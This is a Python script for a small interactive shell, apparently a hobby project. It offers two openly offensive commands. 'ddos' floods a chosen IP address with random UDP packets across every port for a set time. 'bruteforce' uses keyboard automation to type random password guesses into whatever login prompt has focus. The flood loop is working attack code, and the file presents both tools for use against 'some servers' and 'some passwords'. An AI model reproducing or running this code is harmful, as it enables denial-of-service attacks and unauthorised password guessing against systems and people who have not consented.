import sys
import os
import time
import socket
import random
from pynput.keyboard import Key, Controller

"""
Shellpy is a interactive shell with net download,
Shellpy is opensource on github
"""

def shell():
  instring = input("$ ")
  instr = command(instring)[0]
  args = commandDic(instring)
  if instr == "bruteforce":
    if args['n'] >= 1:
      try:
        int(args['n'])
        keyboard = Controller()
        alphabet = "0123456789-ABCEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz"
        alphabetpassfinal = ""
        print("brutefroce will start in 10 seconds!")
        time.sleep(10)
        for j in range(int(args['n'])):
          for i in range(random.randint(3, 10)):
            alphabetpass = alphabet[random.randint(0, (len(alphabet) - 1))]
            alphabetpassfinal = alphabetpassfinal + alphabetpass
          print(alphabetpassfinal)
          keyboard.type(alphabetpassfinal)
          time.sleep(0.06)
          keyboard.press(Key.enter)
          keyboard.release(Key.enter)
          keyboard.press(Key.ctrl)
          keyboard.press("a")
          keyboard.release(Key.ctrl)
          keyboard.release("a")
          keyboard.press(Key.delete)
          keyboard.release(Key.delete)
          alphabetpassfinal = ""
      except ValueError:
        print("Error: the argument `-n number' must be integer, not", type(args['n']))
    else:
        print("Error: `bruteforce' need 1 positional argument `-n'")
  elif instr == "ddos":
    if len(args) >= 2:
      try:
        int(args['t'])
        try:
          socket.inet_aton(args['ip'])
          ip = args['ip']
          start = int(time.time())
          sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
          byte = random._urandom(1490)
          port = 1
          sent = 0
          a=1
          while a==1:
            if int(time.time()) - int(args['t']) == start:
              a = 0
            else:
              sock.sendto(byte, (ip,port))
              sent = sent + 1
              port = port + 1
              if port == 65534:
                port = 1
        except socket.error:
         print("Error, please enter valid IP address")
      except ValueError:
        print("Error: verify types for `-t time' (int) and `-url' (url)")
    else:
      print("Error: `ddos' need 2 positional argument `-t', `-url'")
  elif instr == "truc":
    print("test")
  elif instr == "help":
    print("bruteforce | used to bruteforce some passwords:")
    print("  -n number")
    print("ddos | used to ddos some servers:")
    print("  -t time")
    print("  -ip address")
  else:
    print("Error: command `{}' not found.".format(instr[0]))

def seestr(string):
  liste = []
  for i in range(len(string)):
    if string[i] == '/n':
      liste.append('/'+'n')
    else:
      liste.append(string[i])
  print(liste)
      
def commandDic(string):
  string = command(string)
  dic = {}
  for i in range(len(string) - 1):
    if string[i][0] == '-':
      try:
        dic[string[i][1:]] = string[i+1]
      except:
        dic[string[i][1:]] = None
  return dic

def command(string, point = ' '):
  args = [""]
  alist = 0
  for i in range(len(string)):
    if string[i] == point:
      args.append("")
      alist = alist + 1
    else:
      args[alist] = args[alist] + string[i]
  return args

while(1):
  shell()
